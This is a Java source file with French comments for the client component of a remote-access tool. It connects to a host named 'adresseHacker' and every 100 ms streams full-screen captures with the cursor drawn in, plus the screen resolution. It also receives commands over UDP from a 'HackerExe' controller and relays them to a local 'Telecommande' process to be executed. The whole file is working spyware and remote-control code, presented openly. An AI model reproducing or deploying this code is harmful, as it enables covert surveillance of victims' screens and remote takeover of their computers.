package client;

import java.awt.AWTException;
import java.awt.Graphics2D;
import java.awt.HeadlessException;
import java.awt.MouseInfo;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;


public class ClientExe {
	private final String ressourcesDirectory = System.getProperty("user.dir") + "\\ressources\\";

	private int frameClientWidth; 
	private int frameClientHeight;
	
	private boolean fullscreenSelected = false;

	/* Réseau */
	private static final String adresseHacker = "127.0.0.1";
	private static final int portServeur = 13337;
	private InetSocketAddress adrDest = new InetSocketAddress(adresseHacker, portServeur);
	
	private DatagramSocket listenTelecommandeSocket;

	private static Socket socketClient;
	
	
	
	public static void main (String args[]) throws InterruptedException, IOException, AWTException {
		ClientExe c = new ClientExe();
		c.init();
		c.FullScreenCaptureResized(1280, 720);
		c.listenTelecommande();
	}
	
	
	private void listenTelecommande() throws IOException {
	
		while (true) {
			String receveidCmd = receiveFromHacker();
			sendToTelecommande(receveidCmd);
		}
	}

	
	public void FullScreenCaptureResized(int width, int height) throws IOException, AWTException {
		
		/***********************************************************************/
		new Thread(new Runnable() {
		     public void run() {
		       try {
		    	   while(true) {
		   				Thread.sleep(100);
			    	   	int mX = (int)MouseInfo.getPointerInfo().getLocation().getX();
			    	   	int mY = (int)MouseInfo.getPointerInfo().getLocation().getY();
						
			            /* Prends une screen et rajoute l'image du curseur par dessus */
			            Rectangle screenRec = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());  
			            BufferedImage bi = new Robot().createScreenCapture(screenRec);
			            BufferedImage cursor = ImageIO.read(new File(ressourcesDirectory + "cursor.gif"));
			            bi.getGraphics().drawImage(cursor, mX, mY, null);
			            
			            /* On resize l'image */
			            ImageIcon nativeScreen = new ImageIcon(bi);
			            java.awt.Image imgResized = nativeScreen.getImage().getScaledInstance(width, height, java.awt.Image.SCALE_SMOOTH);
			            
			            BufferedImage BUFF = new BufferedImage(imgResized.getWidth(null), imgResized.getHeight(null), BufferedImage.TYPE_INT_ARGB);
		
			            // Draw the image on to the buffered image
			            Graphics2D bGr = BUFF.createGraphics();
			            bGr.drawImage(imgResized, 0, 0, null);
			            bGr.dispose();
		
			            
			            
			            /* On copie l'image dans un tableau de byte[] */
			            ByteArrayOutputStream baos = new ByteArrayOutputStream();
			            ImageIO.write(BUFF, "gif", baos);
			            
			            /* On envoit ScreenSize= pour spécifier au serveur qu'on va lui envoyer une screenshot */
			            envoyer("ScreenSize=" + baos.size());
			            envoyer( baos.toByteArray() );
			            baos.close();
		    	   }
		       }
		       catch (AWTException | IOException | InterruptedException ex) {System.err.println(ex);}
		     }
		}).start();
		/***********************************************************************/

	}
	
	
	/*
	 * Global Initialization
	 */
	private void init() throws HeadlessException, IOException {
		initSocket();
		NetworkgetSystemProperties();
	}
	
	/*
	 * Initialization of sockets & network stuff
	 */
	private void initSocket() throws IOException {
		socketClient = new Socket();
		socketClient.connect(adrDest);
		
		listenTelecommandeSocket = new DatagramSocket(null);
		listenTelecommandeSocket.bind(new InetSocketAddress(54322));
	}
	
	
	/*
	 * Get some system parameters
	 */
	public void NetworkgetSystemProperties() throws HeadlessException, IOException {
		envoyer("Resolution=" +(int) Toolkit.getDefaultToolkit().getScreenSize().getWidth()+ ":"+(int) Toolkit.getDefaultToolkit().getScreenSize().getHeight());
	}

			
	/*
	 * Send String
	 */
	public void envoyer(String msg) throws IOException {
		byte[] bufE = msg.getBytes();
		OutputStream os = socketClient.getOutputStream();
		os.write(bufE);
		return;
	}
	
	
	/*
	 * Send Byte[]
	 */
	public void envoyer(byte[] msg) throws IOException {
		OutputStream os = socketClient.getOutputStream();
		os.write(msg);
		return;
	}

	
	/*
	 * Listen on UDP port 54322 for some remote commands from HackerExe 
	 */
	private String receiveFromHacker() throws IOException{
		byte[] bufR = new byte[2048];
		DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);		
		listenTelecommandeSocket.receive(dpR);
		return new String(bufR, dpR.getOffset(), dpR.getLength());
	}
	
	
	/*
	 * When the HackerExe writes commands to execute, the following function
	 * sends the commands to the Telecommande (running on the client computer)
	 */
	protected void sendToTelecommande(String msg) throws IOException {
		DatagramSocket socket_send = new DatagramSocket(null);
		 byte[] bufR = new byte[2048];
		 DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);
		 bufR = new String(msg).getBytes();
		 
		 /* Attention, on envoit bien la commande à l'hôte qui execute ClientExe (ce programme)
		 * Donc c'est bien 127.0.0.1:54321 */
		 dpR = new DatagramPacket(bufR, bufR.length, new InetSocketAddress("127.0.0.1", 54321));
		 socket_send.send(dpR);		
	}
	
	
	
	/*
	 * receiveTCP : not used
	
	private static String receiveTCP(DatagramSocket socket) throws IOException {
		byte[] bufR = new byte[2048];
		InputStream is = socketClient.getInputStream();
		int lenBufR = is.read(bufR);
		String msgRecu = new String(bufR, 0 , lenBufR );
		System.out.println("Reponse recue = "+msgRecu);
		return msgRecu;
	}
	*/
}
